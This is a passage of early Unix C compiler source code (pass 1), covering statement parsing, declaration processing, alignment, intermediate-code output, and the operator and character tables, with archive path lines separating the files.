		error("Too many initializers");
	if (((nel&width)&ALIGN))
		outcode("B", EVEN);
}

/*
 * Process a single expression in a sequence of initializers
 * for an external. Mainly, it's for checking
 * type compatibility.
 */
cinit1(ds, type, awidth, aninit, nel)
struct hshtab *ds;
{
	float sf;
	register struct tnode *s;
	register width, ninit;

	width = awidth;
	ninit = aninit;
	if ((peeksym=symbol())==STRING && type==CHAR) {
		peeksym = -1;
		if (ninit)
			bxdec();
		putstr(0);
		if (nel>nchstr) {
			strflg++;
			outcode("BN", SSPACE, nel-nchstr);
			strflg = 0;
			nchstr = nel;
		}
		return(nchstr);
	}
	if (peeksym==RBRACE)
		return(ninit);
	initflg++;
	s = tree();
	initflg = 0;
	switch(width) {

	case 1:
		if (s->op != CON)
			goto bad;
		outcode("B1N0", BDATA, s->value);
		break;

	case 2:
		if (s->op==CON) {
			outcode("B1N0", WDATA, s->value);
			break;
		}
		if (s->op==FCON || s->op==SFCON) {
			if (type==STRUCT) {
				ninit =+ 3;
				goto prflt;
			}
			goto bad;
		}
		rcexpr(block(1,INIT,0,0,s));
		break;

	case 4:
		sf = fcval;
		outcode("B1N1N0", WDATA, sf);
		goto flt;

	case 8:
	prflt:
		outcode("B1N1N1N1N0", WDATA, fcval);
	flt:
		if (s->op==FCON || s->op==SFCON)
			break;

	default:
	bad:
		bxdec();

	}
	return(++ninit);
}

bxdec()
{
	error("Inconsistent external initialization");
}

/*
 * Process one statement in a function.
 */
statement(d)
{
	register o, o1, o2;
	int o3, o4;
	struct tnode *np;

stmt:
	switch(o=symbol()) {

	case EOF:
		error("Unexpected EOF");
	case SEMI:
		return;

	case LBRACE:
		if (d) {
			if (proflg)
				outcode("BN", PROFIL, isn++);
			outcode("BN", SAVE, blkhed());
		}
		while (!eof) {
			if ((o=symbol())==RBRACE)
				return;
			peeksym = o;
			statement(0);
		}
		error("Missing '}'");
		return;

	case KEYW:
		switch(cval) {

		case GOTO:
			if (o1 = simplegoto())
				branch(o1);
			else 
				dogoto();
			goto semi;

		case RETURN:
			doret();
			goto semi;

		case IF:
			np = pexpr();
			o2 = 0;
			if ((o1=symbol())==KEYW) switch (cval) {
			case GOTO:
				if (o2=simplegoto())
					goto simpif;
				cbranch(np, o2=isn++, 0);
				dogoto();
				label(o2);
				goto hardif;

			case RETURN:
				if (nextchar()==';') {
					o2 = retlab;
					goto simpif;
				}
				cbranch(np, o1=isn++, 0);
				doret();
				label(o1);
				o2++;
				goto hardif;

			case BREAK:
				o2 = brklab;
				goto simpif;

			case CONTIN:
				o2 = contlab;
			simpif:
				chconbrk(o2);
				cbranch(np, o2, 1);
			hardif:
				if ((o=symbol())!=SEMI)
					goto syntax;
				if ((o1=symbol())==KEYW && cval==ELSE) 
					goto stmt;
				peeksym = o1;
				return;
			}
			peeksym = o1;
			cbranch(np, o1=isn++, 0);
			statement(0);
			if ((o=symbol())==KEYW && cval==ELSE) {
				o2 = isn++;
				branch(o2);
				label(o1);
				statement(0);
				label(o2);
				return;
			}
			peeksym = o;
			label(o1);
			return;

		case WHILE:
			o1 = contlab;
			o2 = brklab;
			label(contlab = isn++);
			cbranch(pexpr(), brklab=isn++, 0);
			statement(0);
			branch(contlab);
			label(brklab);
			contlab = o1;
			brklab = o2;
			return;

		case BREAK:
			chconbrk(brklab);
			branch(brklab);
			goto semi;

		case CONTIN:
			chconbrk(contlab);
			branch(contlab);
			goto semi;

		case DO:
			o1 = contlab;
			o2 = brklab;
			contlab = isn++;
			brklab = isn++;
			label(o3 = isn++);
			statement(0);
			label(contlab);
			contlab = o1;
			if ((o=symbol())==KEYW && cval==WHILE) {
				cbranch(tree(), o3, 1);
				label(brklab);
				brklab = o2;
				goto semi;
			}
			goto syntax;

		case CASE:
			o1 = conexp();
			if ((o=symbol())!=COLON)
				goto syntax;
			if (swp==0) {
				error("Case not in switch");
				goto stmt;
			}
			if(swp>=swtab+swsiz) {
				error("Switch table overflow");
			} else {
				swp->swlab = isn;
				(swp++)->swval = o1;
				label(isn++);
			}
			goto stmt;

		case SWITCH:
			o1 = brklab;
			brklab = isn++;
			np = pexpr();
			chkw(np, -1);
			rcexpr(block(1,RFORCE,0,0,np));
			pswitch();
			brklab = o1;
			return;

		case DEFAULT:
			if (swp==0)
				error("Default not in switch");
			if ((o=symbol())!=COLON)
				goto syntax;
			label(deflab = isn++);
			goto stmt;

		case FOR:
			o1 = contlab;
			o2 = brklab;
			contlab = isn++;
			brklab = isn++;
			if (o=forstmt())
				goto syntax;
			label(brklab);
			contlab = o1;
			brklab = o2;
			return;
		}

		error("Unknown keyword");
		goto syntax;

	case NAME:
		if (nextchar()==':') {
			peekc = 0;
			o1 = csym;
			if (o1->hclass>0) {
				error("Redefinition");
				goto stmt;
			}
			o1->hclass = STATIC;
			o1->htype = ARRAY;
			if (o1->hoffset==0)
				o1->hoffset = isn++;
			label(o1->hoffset);
			goto stmt;
		}
	}
	peeksym = o;
	rcexpr(tree());

semi:
	if ((o=symbol())==SEMI)
		return;
syntax:
	error("Statement syntax");
	errflush(o);
}

/*
 * Process a for statement.
 */
forstmt()
{
	register int l, o, sline;
	int sline1, *ss;
	struct tnode *st;

	if ((o=symbol()) != LPARN)
		return(o);
	if ((o=symbol()) != SEMI) {		/* init part */
		peeksym = o;
		rcexpr(tree());
		if ((o=symbol()) != SEMI)
			return(o);
	}
	label(contlab);
	if ((o=symbol()) != SEMI) {		/* test part */
		peeksym = o;
		rcexpr(block(1,CBRANCH,tree(),brklab,0));
		if ((o=symbol()) != SEMI)
			return(o);
	}
	if ((peeksym=symbol()) == RPARN) {	/* incr part */
		peeksym = -1;
		statement(0);
		branch(contlab);
		return(0);
	}
	l = contlab;
	contlab = isn++;
	st = tree();
	sline = line;
	if ((o=symbol()) != RPARN)
		return(o);
	ss = treespace;
	treespace = space;
	statement(0);
	sline1 = line;
	line = sline;
	label(contlab);
	rcexpr(st);
	line = sline1;
	treespace = ss;
	branch(l);
	return(0);
}

/*
 * A parenthesized expression,
 * as after "if".
 */
pexpr()
{
	register o, t;

	if ((o=symbol())!=LPARN)
		goto syntax;
	t = tree();
	if ((o=symbol())!=RPARN)
		goto syntax;
	return(t);
syntax:
	error("Statement syntax");
	errflush(o);
	return(0);
}

/*
 * The switch stateent, which involves collecting the
 * constants and labels for the cases.
 */
pswitch()
{
	register struct swtab *cswp, *sswp;
	int dl, swlab;

	cswp = sswp = swp;
	if (swp==0)
		cswp = swp = swtab;
	branch(swlab=isn++);
	dl = deflab;
	deflab = 0;
	statement(0);
	branch(brklab);
	label(swlab);
	if (deflab==0)
		deflab = brklab;
	outcode("BNN", SWIT, deflab, line);
	for (; cswp < swp; cswp++)
		outcode("NN", cswp->swlab, cswp->swval);
	outcode("0");
	label(brklab);
	deflab = dl;
	swp = sswp;
}

/*
 * blkhed is called at the start of each function.
 * It reads the declarations at the start;
 * then assigns storage locations for the
 * parameters (which have been linked into a list,
 * in order of appearance).
 * This list is necessary because in
 * f(a, b) float b; int a; ...
 * the names are seen before the types.
 * Also, the routine adjusts structures involved
 * in some kind of forward-referencing.
 */
blkhed()
{
	register pl;
	register struct hshtab *cs;

	autolen = 6;
	declist(0);
	pl = 4;
	while(paraml) {
		parame->hoffset = 0;
		cs = paraml;
		paraml = paraml->hoffset;
		if (cs->htype==FLOAT)
			cs->htype = DOUBLE;
		cs->hoffset = pl;
		cs->hclass = AUTO;
		if ((cs->htype&XTYPE) == ARRAY) {
			cs->htype =- (ARRAY-PTR);	/* set ptr */
			cs->ssp++;		/* pop dims */
		}
		pl =+ rlength(cs);
	}
	for (cs=hshtab; cs<hshtab+hshsiz; cs++) {
		if (cs->name[0] == '\0')
			continue;
		/* check tagged structure */
		if (cs->hclass>KEYWC && (cs->htype&TYPE)==RSTRUCT) {
			cs->lenp = dimtab[cs->lenp&0377]->lenp;
			cs->htype = cs->htype&~TYPE | STRUCT;
		}
		if (cs->hclass == STRTAG && dimtab[cs->lenp&0377]==0)
			error("Undefined structure: %.8s", cs->name);
		if (cs->hclass == ARG)
			error("Not an argument: %.8s", cs->name);
		if (stflg)
			prste(cs);
	}
	space = treespace;
	outcode("BN", SETREG, regvar);
	return(autolen);
}

/*
 * After a function definition, delete local
 * symbols.
 * Also complain about undefineds.
 */
blkend() {
	register struct hshtab *cs;

	for (cs=hshtab; cs<hshtab+hshsiz; cs++) {
		if (cs->name[0]) {
			if (cs->hclass==0 && (cs->hflag&FNUND)==0) {
				error("%.8s undefined", cs->name);
				cs->hflag =| FNUND;
			}
			if((cs->hflag&FNDEL)==0) {
				cs->name[0] = '\0';
				hshused--;
				cs->hflag =& ~(FNUND|FFIELD);
			}
		}
	}
}

/*
 * write out special definitions of local symbols for
 * benefit of the debugger.  None of these are used
 * by the assembler except to save them.
 */
prste(acs)
{
	register struct hshtab *cs;
	register nkind;

	cs = acs;
	switch (cs->hclass) {
	case REG:
		nkind = RNAME;
		break;

	case AUTO:
		nkind = ANAME;
		break;

	case STATIC:
		nkind = SNAME;
		break;

	default:
		return;

	}
	outcode("BSN", nkind, cs->name, cs->hoffset);
}

/*
 * In case of error, skip to the next
 * statement delimiter.
 */
errflush(ao)
{
	register o;

	o = ao;
	while(o>RBRACE)	/* ; { } */
		o = symbol();
	peeksym  = o;
}
-- /usr/source/c/c03.c mode=0110666 uid=10 gid=1 atime=174920440 mtime=174910918 --
#
/*
 * C compiler, phase 1
 *
 *
 * Handles processing of declarations,
 * except for top-level processing of
 * externals.
 */

#include "c0h.c"

/*
 * Process a sequence of declaration statements
 */
declist(sclass)
{
	register sc, elsize, offset;
	int type;

	offset = 0;
	sc = sclass;
	while ((elsize = getkeywords(&sclass, &type)) != -1) {
		offset = declare(sclass, type, offset, elsize);
		sclass = sc;
	}
	return(offset+align(INT, offset, 0));
}

/*
 * Read the keywords introducing a declaration statement
 */
getkeywords(scptr, tptr)
int *scptr, *tptr;
{
	register skw, tkw, longf;
	int o, elsize, isadecl, ismos;

	isadecl = 0;
	longf = 0;
	tkw = -1;
	skw = *scptr;
	elsize = 0;
	ismos = skw==MOS;
	for (;;) {
		mosflg = ismos;
		switch ((o=symbol())==KEYW? cval: -1) {

		case AUTO:
		case STATIC:
		case EXTERN:
		case REG:
			if (skw && skw!=cval)
				error("Conflict in storage class");
			skw = cval;
			break;
	
		case LONG:
			longf++;
			break;

		case STRUCT:
			o = STRUCT;
			elsize = strdec(&o, ismos);
			cval = o;
		case INT:
		case CHAR:
		case FLOAT:
		case DOUBLE:
			if (tkw>=0)
				error("Type clash");
			tkw = cval;
			break;
	
		default:
			peeksym = o;
			if (isadecl==0)
				return(-1);
			if (tkw<0)
				tkw = INT;
			if (skw==0)
				skw = AUTO;
			if (longf) {
				if (tkw==FLOAT)
					tkw = DOUBLE;
				else if (tkw==INT)
					tkw = LONG;
				else
					error("Misplaced 'long'");
			}
			*scptr = skw;
			*tptr = tkw;
			return(elsize);
		}
		isadecl++;
	}
}

/*
 * Process a structure declaration; a subroutine
 * of getkeywords.
 */
strdec(tkwp, mosf)
int *tkwp;
{
	register elsize, o;
	register struct hshtab *ssym;
	int savebits;
	struct hshtab *ds;

	mosflg = 1;
	ssym = 0;
	if ((o=symbol())==NAME) {
		ssym = csym;
		if (ssym->hclass==0) {
			ssym->hclass = STRTAG;
			ssym->lenp = dimp;
			chkdim();
			dimtab[dimp++] = 0;
		}
		if (ssym->hclass != STRTAG)
			redec();
		mosflg = mosf;
		o = symbol();
	}
	mosflg = 0;
	if (o != LBRACE) {
		if (ssym==0) {
		syntax:
			decsyn(o);
			return(0);
		}
		if (ssym->hclass!=STRTAG)
			error("Bad structure name");
		if ((elsize = dimtab[ssym->lenp&0377])==0) {
			*tkwp = RSTRUCT;
			elsize = ssym;
		}
		peeksym = o;
	} else {
		ds = defsym;
		mosflg = 0;
		savebits = bitoffs;
		bitoffs = 0;
		elsize = declist(MOS);
		bitoffs = savebits;
		defsym = ds;
		if ((o = symbol()) != RBRACE)
			goto syntax;
		if (ssym) {
			if (dimtab[ssym->lenp&0377])
				error("%.8s redeclared", ssym->name);
			dimtab[ssym->lenp&0377] = elsize;
		}
	}
	return(elsize);
}

/*
 * Check that the dimension table has not overflowed
 */
chkdim()
{
	if (dimp >= dimsiz) {
		error("Dimension/struct table overflow");
		exit(1);
	}
}

/*
 * Process a comma-separated list of declarators
 */
declare(askw, tkw, offset, elsize)
{
	register int o;
	register int skw;

	skw = askw;
	do {
		offset =+ decl1(skw, tkw, offset, elsize);
	} while ((o=symbol()) == COMMA);
	if (o==SEMI || o==RPARN && skw==ARG1)
		return(offset);
	decsyn(o);
}

/*
 * Process a single declarator
 */
decl1(askw, tkw, offset, elsize)
{
	int t1, chkoff, a;
	register int type, skw;
	register struct hshtab *dsym;

	skw = askw;
	chkoff = 0;
	mosflg = skw==MOS;
	if ((peeksym=symbol())==SEMI || peeksym==RPARN)
		return(0);
	/*
	 * Filler field
	 */
	if (peeksym==COLON && skw==MOS) {
		peeksym = -1;
		t1 = conexp();
		elsize = align(tkw, offset, t1);
		bitoffs =+ t1;
		return(elsize);
	}
	if ((t1=getype()) < 0)
		goto syntax;
	type = 0;
	do
		type = type<<TYLEN | (t1 & XTYPE);
	while (((t1=>>TYLEN) & XTYPE)!=0);
	type =| tkw;
	dsym = defsym;
	if (!(dsym->hclass==0
	   || (skw==ARG && dsym->hclass==ARG1)
	   || (skw==EXTERN && dsym->hclass==EXTERN && dsym->htype==type)))
		if (skw==MOS && dsym->hclass==MOS && dsym->htype==type)
			chkoff = 1;
		else {
			redec();
			goto syntax;
		}
	dsym->htype = type;
	if (skw)
		dsym->hclass = skw;
	if (skw==ARG1) {
		if (paraml==0)
			paraml = dsym;
		else
			parame->hoffset = dsym;
		parame = dsym;
	}
	if (elsize && ((type&TYPE)==RSTRUCT || (type&TYPE)==STRUCT)) {
		dsym->lenp = dimp;
		chkdim();
		dimtab[dimp++] = elsize;
	}
	elsize = 0;
	if (skw==MOS) {
		elsize = length(dsym);
		t1 = 0;
		if ((peeksym = symbol())==COLON) {
			elsize = 0;
			peeksym = -1;
			t1 = conexp();
			dsym->hflag =| FFIELD;
		}
		a = align(type, offset, t1);
		elsize =+ a;
		offset =+ a;
		if (t1) {
			if (chkoff && (dsym->bitoffs!=bitoffs
		 	 || dsym->flen!=t1))
				redec();
			dsym->bitoffs = bitoffs;
			dsym->flen = t1;
			bitoffs =+ t1;
		}
		if (chkoff && dsym->hoffset != offset)
			redec();
		dsym->hoffset = offset;
	}
	if ((dsym->htype&XTYPE)==FUNC) {
		if (dsym->hclass!=EXTERN && dsym->hclass!=AUTO)
			error("Bad function");
		dsym->hclass = EXTERN;
	}
	if (dsym->hclass==AUTO) {
		autolen =+ rlength(dsym);
		dsym->hoffset = -autolen;
	} else if (dsym->hclass==STATIC) {
		dsym->hoffset = isn;
		outcode("BBNBNB", BSS, LABEL, isn++,
		    SSPACE, rlength(dsym), PROG);
	} else if (dsym->hclass==REG) {
		if ((type&TYPE)>CHAR && (type&XTYPE)==0
		 || (type&XTYPE)>PTR || regvar<3)
			error("Bad register %o", type);
		dsym->hoffset = --regvar;
	}
syntax:
	return(elsize);
}

/*
 * Read a declarator and get the implied type
 */
getype()
{
	register int o, type;
	register struct hshtab *ds;

	switch(o=symbol()) {

	case TIMES:
		return(getype()<<TYLEN | PTR);

	case LPARN:
		type = getype();
		if ((o=symbol()) != RPARN)
			goto syntax;
		goto getf;

	case NAME:
		defsym = ds = csym;
		type = 0;
		ds->ssp = dimp;
	getf:
		switch(o=symbol()) {

		case LPARN:
			if (xdflg) {
				xdflg = 0;
				ds = defsym;
				declare(ARG1, 0, 0, 0);
				defsym = ds;
				xdflg++;
			} else
				if ((o=symbol()) != RPARN)
					goto syntax;
			type = type<<TYLEN | FUNC;
			goto getf;

		case LBRACK:
			chkdim();
			if ((o=symbol()) != RBRACK) {
				peeksym = o;
				cval = conexp();
				for (o=ds->ssp&0377; o<dimp; o++)
					dimtab[o] =* cval;
				dimtab[dimp++] = cval;
				if ((o=symbol())!=RBRACK)
					goto syntax;
			} else
				dimtab[dimp++] = 1;
			type = type<<TYLEN | ARRAY;
			goto getf;
		}
		peeksym = o;
		return(type);
	}
syntax:
	decsyn(o);
	return(-1);
}

/*
 * Enforce alignment restrictions in structures,
 * including bit-field considerations.
 */
align(type, offset, aflen)
{
	register a, t, flen;
	char *ftl;

	flen = aflen;
	a = offset;
	t = type;
	ftl = "Field too long";
	if (flen==0 && bitoffs) {
		a =+ (bitoffs-1) / NBPC;
		bitoffs = 0;
	}
	while ((t&XTYPE)==ARRAY)
		t = decref(t);
	if (t!=CHAR) {
		a = (a+ALIGN) & ~ALIGN;
		if (a>offset)
			bitoffs = 0;
	}
	if (flen) {
		if (type==INT) {
			if (flen > NBPW)
				error(ftl);
			if (flen+bitoffs > NBPW) {
				bitoffs = 0;
				a =+ NCPW;
			}
		} else if (type==CHAR) {
			if (flen > NBPC)
				error(ftl);
			if (flen+bitoffs > NCPW) {
				bitoffs = 0;
				a =+ 1;
			}
		} else
			error("Bad type for field");
	}
	return(a-offset);
}

/*
 * Complain about syntax error in declaration
 */
decsyn(o)
{
	error("Declaration syntax");
	errflush(o);
}

/*
 * Complain about a redeclaration
 */
redec()
{
	error("%.8s redeclared", defsym->name);
}
-- /usr/source/c/c04.c mode=0110644 uid=10 gid=1 atime=174920455 mtime=174910924 --
#
/*
 * C compiler
 *
 *
 */

#include "c0h.c"

/*
 * Reduce the degree-of-reference by one.
 * e.g. turn "ptr-to-int" into "int".
 */
decref(at)
{
	register t;

	t = at;
	if ((t & ~TYPE) == 0) {
		error("Illegal indirection");
		return(t);
	}
	return((t>>TYLEN) & ~TYPE | t&TYPE);
}

/*
 * Increase the degree of reference by
 * one; e.g. turn "int" to "ptr-to-int".
 */
incref(t)
{
	return(((t&~TYPE)<<TYLEN) | (t&TYPE) | PTR);
}

/*
 * Make a tree that causes a branch to lbl
 * if the tree's value is non-zero together with the cond.
 */
cbranch(tree, lbl, cond)
struct tnode *tree;
{
	rcexpr(block(1,CBRANCH,tree,lbl,cond));
}

/*
 * Write out a tree.
 */
rcexpr(tree)
struct tnode *tree;
{

	treeout(tree);
	outcode("BN", EXPR, line);
}

treeout(atree)
struct tnode *atree;
{
	register struct tnode *tree;

	if ((tree = atree) == 0)
		return;
	switch(tree->op) {

	case 0:
		outcode("B", NULL);
		return;

	case NAME:
		outcode("BNN", NAME, tree->class, tree->type);
		if (tree->class==EXTERN)
			outcode("S", tree->nname);
		else
			outcode("N", tree->nloc);
		return;

	case CON:
	case FCON:
	case SFCON:
		outcode("BNN", tree->op, tree->type, tree->value);
		return;

	case FSEL:
		treeout(tree->tr1);
		outcode("BNN", tree->op, tree->type, tree->tr2);
		return;

	case CBRANCH:
		treeout(tree->btree);
		outcode("BNN", tree->op, tree->lbl, tree->cond);
		return;

	default:
		treeout(tree->tr1);
		if (opdope[tree->op]&BINARY)
			treeout(tree->tr2);
		outcode("BN", tree->op, tree->type);
		return;
	}
}

/*
 * Generate a branch
 */
branch(lab) {
	outcode("BN", BRANCH, lab);
}

/*
 * Generate a label
 */
label(l) {
	outcode("BN", LABEL, l);
}

/*
 * ap is a tree node whose type
 * is some kind of pointer; return the size of the object
 * to which the pointer points.
 */
plength(ap)
struct tname *ap;
{
	register t, l;
	register struct tname *p;

	p = ap;
	if (p==0 || ((t=p->type)&~TYPE) == 0)		/* not a reference */
		return(1);
	p->type = decref(t);
	l = length(p);
	p->type = t;
	return(l);
}

/*
 * return the number of bytes in the object
 * whose tree node is acs.
 */
length(acs)
struct tnode *acs;
{
	register t, n;
	register struct tnode *cs;

	cs = acs;
	t = cs->type;
	n = 1;
	while ((t&XTYPE) == ARRAY) {
		t = decref(t);
		n = dimtab[cs->ssp&0377];
	}
	if ((t&~TYPE)==FUNC)
		return(0);
	if (t>=PTR)
		return(2*n);
	switch(t&TYPE) {

	case INT:
		return(2*n);

	case CHAR:
		return(n);

	case FLOAT:
	case LONG:
		return(4*n);

	case DOUBLE:
		return(8*n);

	case STRUCT:
		return(n * dimtab[cs->lenp&0377]);

	case RSTRUCT:
		error("Bad structure");
		return(0);
	}
	error("Compiler error (length)");
}

/*
 * The number of bytes in an object, rounded up to a word.
 */
rlength(cs)
struct tnode *cs;
{
	return((length(cs)+ALIGN) & ~ALIGN);
}

/*
 * After an "if (...) goto", look to see if the transfer
 * is to a simple label.
 */
simplegoto()
{
	register struct hshtab *csp;

	if ((peeksym=symbol())==NAME && nextchar()==';') {
		csp = csym;
		if (csp->hclass==0 && csp->htype==0) {
			csp->htype = ARRAY;
			if (csp->hoffset==0)
				csp->hoffset = isn++;
		}
		if ((csp->hclass==0||csp->hclass==STATIC)
		 &&  csp->htype==ARRAY) {
			peeksym = -1;
			return(csp->hoffset);
		}
	}
	return(0);
}

/*
 * Return the next non-white-space character
 */
nextchar()
{
	while (spnextchar()==' ')
		peekc = 0;
	return(peekc);
}

/*
 * Return the next character, translating all white space
 * to blank and handling line-ends.
 */
spnextchar()
{
	register c;

	if ((c = peekc)==0)
		c = getchar();
	if (c=='\t')
		c = ' ';
	else if (c=='\n') {
		c = ' ';
		if (inhdr==0)
			line++;
		inhdr = 0;
	} else if (c=='\001') {	/* SOH, insert marker */
		inhdr++;
		c = ' ';
	}
	peekc = c;
	return(c);
}

/*
 * is a break or continue legal?
 */
chconbrk(l)
{
	if (l==0)
		error("Break/continue error");
}

/*
 * The goto statement.
 */
dogoto()
{
	register struct tnode *np;

	*cp++ = tree();
	build(STAR);
	chkw(np = *--cp, -1);
	rcexpr(block(1,JUMP,0,0,np));
}

/*
 * The return statement, which has to convert
 * the returned object to the function's type.
 */
doret()
{
	register struct tnode *t;

	if (nextchar() != ';') {
		t = tree();
		*cp++ = &funcblk;
		*cp++ = t;
		build(ASSIGN);
		cp[-1] = cp[-1]->tr2;
		build(RFORCE);
		rcexpr(*--cp);
	}
	branch(retlab);
}

/*
 * write out a character to the usual output
 * or to the string file
 */
putchar(c)
{
	write(1, &c, 1);
}

outcode(s, a)
char *s;
{
	register char *sp;
	register *ap, *bufp;
	int n;
	char *np;

	bufp = obuf;
	if (strflg)
		bufp = sbuf;
	ap = &a;
	for (;;) switch(*s++) {
	case 'B':
		putw(*ap++ | (0376<<8), bufp);
		continue;

	case 'N':
		putw(*ap++, bufp);
		continue;

	case 'S':
		np = *ap++;
		n = ncps;
		while (n-- && *np) {
			putc(*np++, bufp);
		}
		putc(0, bufp);
		continue;

	case '1':
		putw(1, bufp);
		continue;

	case '0':
		putw(0, bufp);
		continue;

	case '\0':
		return;
	}
	error("Botch in outcode");
}
-- /usr/source/c/c05.c mode=0110644 uid=10 gid=1 atime=174920468 mtime=174910925 --
#
#include "c0h.c"
/*
 *  info on operators:
 *   01-- is binary operator
 *   02-- left (or only) operand must be lvalue
 *   04-- is relational operator
 *  010-- is assignment-type operator
 *  020-- non-float req. on left
 *  040-- non-float req. on right
 * 0100-- is commutative
 * 0200-- is right, not left-associative
 * 0400-- is leaf of tree
 * *0XX000-- XX is priority of operator
 */
int opdope[] {
	000000,	/* EOF */
	000000,	/* ; */
	000000,	/* { */
	000000,	/* } */
	036000,	/* [ */
	002000,	/* ] */
	036000,	/* ( */
	002000,	/* ) */
	014201,	/* : */
	007001,	/* , */
	000000,	/* field selection */
	000000,	/* 11 */
	000000,	/* 12 */
	000000,	/* 13 */
	000000,	/* 14 */
	000000,	/* 15 */
	000000,	/* 16 */
	000000,	/* 17 */
	000000,	/* 18 */
	000000,	/* 19 */
	000400,	/* name */
	000400,	/* short constant */
	000400,	/* string */
	000400,	/* float */
	000400,	/* double */
	000000,	/* 25 */
	000000,	/* 26 */
	000000,	/* 27 */
	000000,	/* 28 */
	000000, /* 29 */
	034203,	/* ++pre */
	034203,	/* --pre */
	034203,	/* ++post */
	034203,	/* --post */
	034220,	/* !un */
	034202,	/* &un */
	034220,	/* *un */
	034200,	/* -un */
	034220,	/* ~un */
	036001,	/* . (structure reference) */
	030101,	/* + */
	030001,	/* - */
	032101,	/* * */
	032001,	/* / */
	032001,	/* % */
	026061,	/* >> */
	026061,	/* << */
	020161,	/* & */
	017161,	/* | */
	017161,	/* ^ */
	036001,	/* -> */
	000000, /* int -> double */
	000000, /* double -> int */
	016001, /* && */
	015001, /* || */
	030001, /* &~ */
	000000, /* 56 */
	000000, /* 57 */
	000000, /* 58 */
	000000,	/* 59 */
	022005,	/* == */
	022005,	/* != */
	024005,	/* <= */
	024005,	/* < */
	024005,	/* >= */
	024005,	/* > */
	024005,	/* <p */
	024005,	/* <=p */
	024005,	/* >p */
	024005,	/* >=p */
	012213,	/* =+ */
	012213,	/* =- */
	012213,	/* =* */
	012213,	/* =/ */
	012213,	/* =% */
	012253,	/* =>> */
	012253,	/* =<< */
	012253,	/* =& */
	012253,	/* =| */
	012253,	/* =^ */
	012213,	/* = */
	000000,	/* 81 */
	000000,	/* 82 */
	000000,	/* 83 */
	000000,	/* 84 */
	000000,	/* 85 */
	000000,	/* 86 */
	000000,	/* 87 */
	000000,	/* 88 */
	000000,	/* 89 */
	014201,	/* ? */
	034200,	/* sizeof */
	000000,	/* 92 */
	000000,	/* 93 */
	000000,	/* 94 */
	000000,	/* 95 */
	000000,	/* 96 */
	000000,	/* 97 */
	000000,	/* 98 */
	000000,	/* 99 */
	036001,	/* call */
	036001,	/* mcall */
	000000,	/* goto */
	000000,	/* jump cond */
	000000,	/* branch cond */
	000000,	/* 105 */
	000000, /* 106 */
	000000,	/* 107 */
	000000,	/* 108 */
	000000,	/* 109 */
	000000	/* force r0 */
};

/*
 * conversion table:
 * FTI: float (or double) to integer
 * ITF: integer to float
 * ITP: integer to pointer
 * ITL: integer to long
 * LTI: long to integer
 * LTF: long to float
 * FTL: float to long
 * PTI: pointer to integer
 * XX: usually illegal
 * When FTI, LTI, FTL are added in they specify
 * that it is the left operand that should be converted.
 * For + this is done and the conversion is turned back into
 * ITF, ITL, LTF.
 * For = however the left operand can't be converted
 * and the specified conversion is applied to the rhs.
 */
char cvtab[4][4] {
/*		int	double		long		ptr */
/* int */	0,	(FTI<<4)+ITF,	(LTI<<4)+ITL,	(ITP<<4)+ITP,	
/* double */	ITF,	0,		LTF,		XX,
/* long */	ITL,	(FTL<<4)+LTF,	0,		XX,
/* ptr */	ITP,	XX,		XX,		PTI
};

/*
 * character type table
 */
char ctab[] {
	EOF,	INSERT,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,
	UNKN,	SPACE,	NEWLN,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,
	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,
	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,	UNKN,
	SPACE,	EXCLA,	DQUOTE,	UNKN,	UNKN,	MOD,	 AND,	SQUOTE,
	LPARN,	RPARN,	TIMES,	PLUS,	COMMA,	MINUS,	PERIOD,	DIVIDE,
	DIGIT,	DIGIT,	DIGIT,	DIGIT,	DIGIT,	DIGIT,	DIGIT,	DIGIT,
	DIGIT,	DIGIT,	COLON,	SEMI,	LESS,	ASSIGN,	GREAT,	QUEST,
	UNKN,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,
	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,
	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,
	LETTER,	LETTER,	LETTER,	LBRACK,	UNKN,	RBRACK,	EXOR,	LETTER,
	UNKN,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,
	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,
	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,	LETTER,
	LETTER,	LETTER,	LETTER,	LBRACE,	OR,	RBRACE,	COMPL,	UNKN
};
-- /usr/source/c/c0h.c mode=0110644 uid=10 gid=1 atime=174920467 mtime=174910917 --
#
/*

	C compiler-- pass 1 header


*/

/*
  parameters
*/

#define	ncps	8
#define	hshsiz	200
#define	cmsiz	40
#define	swsiz	200
#define	OSSIZ	500
#define	dimsiz	100
#define	NBPW	16
#define	NBPC	8
#define	NCPW	2
#define	STRSIZ	256

struct tnode {
	int	op;
	int	type;
	int	dimp;
	struct	tnode *tr1, *tr2;
};

struct {
	int	op;
	int	type;
	char	ssp;		/* subscript list */
	char	lenp;		/* structure length */
};

struct tname {
	int	op;
	int	type;
	int	dimp;
	int	class;
	int	offset;
	int	nloc;
};

struct txname {
	int	op;
	int	type;
	int	dimp;
	int	class;
	int	offset;
	char	nname[ncps];
};

struct tconst {
	int	op;
	int	type;
	int	dimp;
	int	value;
};

struct hshtab {
	char	hclass;
	char	hflag;
	int	htype;
	int	hdimp;
	int	hoffset;
	char	name[ncps];
};

struct {
	char	hclass;
	char	hflag;
	int	htype;
	char	flen;		/* Field length */
	char	bitoffs;	/* Offset of field */
};

struct swtab {
	int	swlab;
	int	swval;
};

struct	bnode {
	int	bop;
	struct	tnode *btree;
	int	lbl;
	int	cond;
};

char	cvtab[4][4];
char	savstr[STRSIZ];
char	*strptr;
int	opdope[];
char	ctab[];
char	symbuf[ncps+2];
int	hshused;
struct	hshtab	hshtab[hshsiz];
int	*space;
int	*cp;
int	cmst[cmsiz];
int	isn;
struct	swtab	swtab[swsiz];
struct	swtab	*swp;
int	contlab;
int	brklab;
int	retlab;
int	deflab;
int	nauto;
int	autolen;
int	peeksym;
int	peekc;
int	eof;
int	line;
int	osspace[OSSIZ];
int	*treespace;
struct	hshtab	*defsym;
struct	hshtab	*funcsym;
int	xdflg;
int	proflg;
int	stflg;
